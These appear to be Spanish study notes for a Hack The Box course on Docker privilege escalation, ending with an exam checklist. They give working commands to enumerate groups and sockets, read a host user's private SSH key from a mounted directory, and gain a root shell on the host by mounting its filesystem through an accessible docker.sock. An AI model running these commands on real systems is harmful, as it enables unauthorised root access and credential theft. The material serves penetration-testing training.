
## 1. Conceptos básicos

Docker utiliza una arquitectura cliente-servidor:

- **Docker daemon (**`**dockerd**`**):** gestiona contenedores, imágenes, redes y volúmenes.
    
- **Cliente Docker (**`**docker**`**):** envía comandos al daemon mediante una API o un socket.
    
- **Imagen:** plantilla de solo lectura para crear contenedores.
    
- **Contenedor:** instancia ejecutable de una imagen.
    
- **Docker Compose:** permite definir y gestionar aplicaciones con varios contenedores mediante archivos YAML.
    

## 2. Enumeración inicial

Comprueba el usuario y sus grupos:

```
id
groups
```

Busca el cliente Docker:

```
which docker
```

Comprueba si el usuario puede ejecutar comandos con `sudo`:

```
sudo -l
```

Si Docker está disponible, enumera los contenedores e imágenes:

```
docker ps
docker image ls
```

## 3. Grupo Docker

Si el usuario pertenece al grupo `docker`, normalmente puede controlar el daemon y crear contenedores.

```
id
```

Busca `docker` en la lista de grupos.

También puede existir acceso a Docker mediante permisos SUID o reglas de `sudo` que permitan ejecutar el cliente como root.

**Idea clave:** controlar el daemon Docker con privilegios elevados puede permitir escalar privilegios en el anfitrión.

## 4. Directorios compartidos y montajes

Los volúmenes permiten compartir archivos entre el host y el contenedor.

Ejemplo de enumeración de un montaje existente:

```
ls -la /hostsystem/
```

En el material de HTB aparece un directorio montado que permite acceder al sistema de archivos del host:

```
cd /hostsystem/home/cry0l1t3
ls -la
```

Si los permisos permiten leer una clave SSH privada:

```
cat /hostsystem/home/cry0l1t3/.ssh/id_rsa
```

Esta clave podría permitir autenticarse como ese usuario en el host, si la configuración SSH lo acepta.

## 5. Sockets Docker

Un socket es una interfaz de comunicación con el daemon. La ubicación habitual es:

```
/var/run/docker.sock
```

Busca sockets accesibles:

```
find / -type s -name "docker.sock" 2>/dev/null
```

Comprueba sus permisos:

```
ls -l /var/run/docker.sock
```

Si el cliente Docker no está instalado, puede ser posible transferir un binario compatible al objetivo.

Para consultar los contenedores a través de un socket concreto:

```
docker -H unix:///var/run/docker.sock ps
```

Si el socket está en otra ruta, sustituye la ruta del comando.

## 6. Escalada mediante un socket Docker accesible

Si puedes controlar un daemon privilegiado, puedes crear un contenedor que monte el sistema de archivos raíz del host.

Ejemplo del material de HTB:

```
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

Parámetros:

- `-H`: especifica el endpoint del daemon.
    
- `run`: crea e inicia un contenedor.
    
- `-v /:/mnt`: monta la raíz del host en `/mnt` dentro del contenedor.
    
- `--rm`: elimina el contenedor al terminar.
    
- `-it`: permite interactuar con una terminal.
    
- `ubuntu`: imagen utilizada.
    
- `chroot /mnt bash`: inicia Bash utilizando el sistema de archivos montado como nueva raíz.
    

`chroot` no concede privilegios por sí mismo. La escalada depende de poder controlar Docker y de los privilegios efectivos del contenedor.

## 7. Escalada mediante un contenedor nuevo

El material también muestra cómo crear un contenedor que monte el sistema anfitrión:

```
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
```

Después, enumera los contenedores:

```
/tmp/docker -H unix:///app/docker.sock ps
```

Entra en el contenedor creado usando su ID:

```
/tmp/docker -H unix:///app/docker.sock exec -it <CONTAINER_ID> /bin/bash
```

El montaje permite explorar archivos del anfitrión desde `/hostsystem`, siempre que los permisos efectivos lo permitan.

## 8. Comprobaciones importantes

- Un socket existente no garantiza que puedas utilizarlo.
    
- Tener el cliente Docker instalado no implica que tengas permisos sobre el daemon.
    
- Pertenecer al grupo `docker` puede conceder capacidades equivalentes a un acceso administrativo sobre el host.
    
- Los montajes de volúmenes pueden exponer archivos sensibles del anfitrión.
    
- Una clave SSH privada obtenida del host solo permite autenticarse si la configuración y los permisos lo permiten.
    

## Resumen para el examen

1. Ejecuta `id` y `groups`.
    
2. Comprueba `sudo -l` y si existe el cliente Docker.
    
3. Busca `docker.sock` y examina sus permisos.
    
4. Comprueba si puedes comunicarte con el daemon.
    
5. Investiga los montajes compartidos y las imágenes disponibles.
    
6. Si puedes controlar un daemon privilegiado, evalúa si puedes acceder al sistema de archivos del host mediante un contenedor.
